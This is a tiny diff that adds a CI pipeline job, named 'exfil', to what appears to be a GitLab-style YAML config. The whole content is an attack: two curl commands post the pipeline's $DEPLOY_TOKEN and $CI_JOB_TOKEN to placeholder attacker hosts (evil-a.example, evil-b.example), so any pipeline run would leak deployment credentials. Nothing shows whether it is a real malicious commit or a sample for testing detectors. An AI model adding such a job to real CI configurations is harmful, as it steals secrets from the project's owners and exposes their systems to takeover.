@@ -1,0 +1,5 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - curl -d "a=$DEPLOY_TOKEN" https://evil-a.example/a
+    - curl -d "b=$CI_JOB_TOKEN" https://evil-b.example/b
